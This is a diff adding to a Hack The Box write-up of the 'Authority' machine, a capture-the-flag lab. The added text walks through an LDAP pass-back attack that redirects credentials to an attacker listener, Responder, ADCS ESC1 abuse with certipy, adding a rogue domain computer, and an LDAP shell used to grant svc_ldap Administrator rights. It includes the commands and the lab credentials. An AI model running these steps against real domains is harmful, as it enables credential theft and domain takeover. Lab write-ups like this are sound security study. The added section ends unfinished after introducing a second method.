@@ -317,13 +317,198 @@ Vault password:
 Decryption successful
 ```
 
-Tried to verify the `svc_ldap` credentials but doesn't work
+![Description](/static/images/htb/windows/authority/14.jpg)
+
+Tried to verify the `svc_ldap` credentials but they are not valid
 
 ```
-nxc smb authority.htb -u 'svc_ldap' -p 'DevT3st@123'
+❯ nxc smb authority.htb -u 'svc_ldap' -p 'DevT3st@123'
 ```
 
 ![Description](/static/images/htb/windows/authority/13.jpg)
+
+Then I tried to login to the configuration webpage with `pWm_@dm!N_!23` and it worked
+
+![Description](/static/images/htb/windows/authority/15.jpg)
+
+Since this looked like an LDAP configuration page, I opted to try the Pass-back Attack like I did in [Return](https://mfkrypt.github.io/blog/htb/machines/windows/return#recon)
+
+Start a listener
+
+```
+❯ nc -lvnp 389
+```
+
+![Description](/static/images/htb/windows/authority/16.jpg)
+
+Now we change the address to our listener setup
+
+```
+ldaps://10.10.14.72:389
+```
+
+Click on the 'Test LDAP Profile', then we get a callback but something happens
+
+![Description](/static/images/htb/windows/authority/17.jpg)
+
+Looks like a bunch of junk because of the LDAP over SSL connection, LDAPS protocol even though we changed the port. We just need
+to input ldap instead of ldaps
+
+```
+ldap://10.10.14.72:389
+```
+
+Repeat the same process and we should get the cleartext credentials
+
+![Description](/static/images/htb/windows/authority/18.jpg)
+
+Got em, also turns out we could also use Responder for this
+
+```
+❯ sudo responder -I tun0 -v
+```
+
+![Description](/static/images/htb/windows/authority/19.jpg)
+
+verify the credentials
+
+![Description](/static/images/htb/windows/authority/20.jpg)
+
+Nice! we can also WinRM inside the machine and get the user flag
+
+![Description](/static/images/htb/windows/authority/21.jpg)
+
+I tried to run Winpeas but didn't found anything useful. So i ran Bloodhound
+
+![Description](/static/images/htb/windows/authority/22.jpg)
+
+There were no Outbound Object Control ACLs for `svc_ldap` but I found this unusual group, `Certificate Service DCOM Access`.
+I did a bit of research and turns out there was a Blackhat Talk about getting Domain Admin with DCOM
+
+https://i.blackhat.com/Asia-24/Presentations/Asia-24-Ding-CertifiedDCOM-The-Privilege-Escalation-Journey-to-Domain-Admin.pdf
+
+Also contains a link to a Youtube video that demonstrates the exploit
+
+https://www.youtube.com/watch?v=OHwjeGUSM4w
+
+Here are the steps:
+
+![Description](/static/images/htb/windows/authority/23.jpg)
+
+However, we have to modify a few things since our situation is a little bit different. Firstly, enumerate ADCS for vulnerable templates
+
+```
+❯ certipy find -u svc_ldap -p lDaP_1n_th3_cle4r! -target authority.htb -stdout -vulnerable
+```
+
+![Description](/static/images/htb/windows/authority/24.jpg)
+
+we can clearly see ESC1 here and might think this is an easy win but the thing here is we can only request a certificate if we are
+part of the `Domain Computers` group that we are not part of currently. So, we need to add a new computer to the domain. We need to check if
+we can add a computer by inspecting the `MachineAccountQuota` attribute.
+
+```
+❯ nxc ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
+```
+
+![Description](/static/images/htb/windows/authority/25.jpg)
+
+Perfect, we can add up to 10 computers. Now, let us add the rogue computer
+
+```
+❯ impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Password123!' -dc-host 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
+```
+
+![Description](/static/images/htb/windows/authority/26.jpg)
+
+Then, we give delegation rights from our rogue computer to the target machine
+
+```
+❯ impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'AUTHORITY$' -action write authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.129.229.56 -use-ldaps
+```
+
+![Description](/static/images/htb/windows/authority/27.jpg)
+
+That didn't work and I got this error which was odd because the `msDS-Allowedtoactonbehalfofotheridentity` attribute was supposed to be empty.
+So I tried to enumerate ADCS using the rogue computer
+
+```
+❯ certipy req -u 'ATTACKERSYSTEM$' -p 'Password123!' -dc-ip 10.129.229.56 -target authority.htb -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -target-ip 10.129.229.56
+```
+
+![Description](/static/images/htb/windows/authority/28.jpg)
+
+That worked, now we authenticate using the certificate
+
+```
+❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.229.56'
+```
+
+![Description](/static/images/htb/windows/authority/29.jpg)
+
+Also doesn't work, did some ChatGPT'ing and Googling explained that the DC does not support PKINIT buttttttt we can try using LDAP
+which supports Schannel, authentication throigh TLS. Spawning an LDAP shell
+
+```
+❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.229.56' -ldap-shell
+```
+
+![Description](/static/images/htb/windows/authority/30.jpg)
+
+It works! we authenticated as Administrator but right now we can't directly grab the flag. However, we can execute LDAP commands like
+changing permissions or adding our user to the `Administrators` group :)
+
+```
+# get_user_groups Administrator
+
+CN=Administrators,CN=Builtin,DC=authority,DC=htb
+CN=Schema Admins,CN=Users,DC=authority,DC=htb
+CN=Enterprise Admins,CN=Users,DC=authority,DC=htb
+CN=Domain Admins,CN=Users,DC=authority,DC=htb
+CN=Group Policy Creator Owners,CN=Users,DC=authority,DC=htb
+CN=Denied RODC Password Replication Group,CN=Users,DC=authority,DC=htb
+
+# add_user_to_group svc_ldap Administrators
+
+Adding user: svc_ldap to group Administrators result: OK
+```
+
+Let's verify it worked
+
+```Powershell
+*Evil-WinRM* PS C:\Users\svc_ldap> net user svc_ldap
+```
+
+![Description](/static/images/htb/windows/authority/31.jpg)
+
+Yep, now we can manually grab the flag from `Administrator`'s `Desktop`
+
+![Description](/static/images/htb/windows/authority/32.jpg)
+
+Now, for the 2nd method that is a little bit different, 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
